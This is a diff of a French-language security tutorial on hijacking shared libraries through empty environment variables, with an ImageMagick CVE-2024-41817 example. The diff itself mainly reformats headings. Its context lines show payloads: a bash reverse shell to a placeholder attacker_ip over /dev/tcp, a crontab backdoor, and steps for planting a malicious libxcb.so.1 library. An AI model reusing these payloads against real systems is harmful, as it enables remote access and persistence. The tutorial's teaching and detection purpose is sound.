@@ -6,9 +6,11 @@
 
 Le **Library Hijacking** via variables d'environnement vides est une technique d'exploitation qui tire parti d'un défaut de configuration dans la résolution des chemins de bibliothèques partagées. Lorsqu'une application définit des variables d'environnement avec des valeurs vides ou nulles pour localiser ses bibliothèques, le système d'exploitation va chercher ces bibliothèques dans le répertoire de travail actuel (CWD).
 
+***
+
 ### <mark style="color:blue;">Mécanisme technique</mark>
 
-#### Variables d'environnement critiques
+#### <mark style="color:green;">Variables d'environnement critiques</mark>
 
 Les principales variables exploitables sont :
 
@@ -16,7 +18,7 @@ Les principales variables exploitables sont :
 * **`PATH`** : Chemin vers les exécutables
 * **Variables spécifiques** : Comme `MAGICK_CONFIGURE_PATH` pour ImageMagick
 
-#### Processus d'exploitation
+#### <mark style="color:green;">Processus d'exploitation</mark>
 
 ```
 1. Application définie : LD_LIBRARY_PATH=""
@@ -26,9 +28,11 @@ Les principales variables exploitables sont :
 5. Code malveillant : s'exécute automatiquement
 ```
 
+***
+
 ### <mark style="color:blue;">Anatomie d'une bibliothèque malveillante</mark>
 
-#### Structure de base
+#### <mark style="color:green;">Structure de base</mark>
 
 ```c
 #include <stdio.h>
@@ -48,7 +52,7 @@ int legitimate_function() {
 }
 ```
 
-#### Types de payloads
+#### <mark style="color:green;">Types de payloads</mark>
 
 **1. Exfiltration de données**
 
@@ -77,13 +81,15 @@ system("crontab -l > /tmp/cron_backup; echo '* * * * * /tmp/backdoor' | crontab 
 system("bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &");
 ```
 
+***
+
 ### <mark style="color:blue;">Exemple concret : CVE-2024-41817 (ImageMagick)</mark>
 
-#### Contexte
+#### <mark style="color:green;">Contexte</mark>
 
 ImageMagick 7.1.1-35 définit parfois `MAGICK_CONFIGURE_PATH=""` et `LD_LIBRARY_PATH=""`, causant une recherche dans le CWD.
 
-#### Exploitation pratique
+#### <mark style="color:green;">Exploitation pratique</mark>
 
 **1. Reconnaissance**
 
@@ -128,6 +134,8 @@ cp libxcb.so.1 /opt/app/static/assets/images/
 # La bibliothèque sera chargée lors de la prochaine exécution d'ImageMagick
 ```
 
+***
+
 ### <mark style="color:blue;">Vecteurs d'attaque communs</mark>
 
 #### Applications vulnérables typiques
@@ -138,7 +146,7 @@ cp libxcb.so.1 /opt/app/static/assets/images/
 * **Node.js** : `NODE_PATH`
 * **Perl** : `PERL5LIB`
 
-#### Scénarios d'exploitation
+#### <mark style="color:green;">Scénarios d'exploitation</mark>
 
 **1. Scripts automatisés**
 
@@ -164,9 +172,11 @@ os.system('identify uploaded_image.jpg')  # Vulnérable
 0 * * * * cd /home/user/data && process_data
 ```
 
+***
+
 ### <mark style="color:blue;">Techniques de détection</mark>
 
-#### Surveillance en temps réel
+#### <mark style="color:green;">Surveillance en temps réel</mark>
 
 **1. Monitoring des bibliothèques chargées**
 
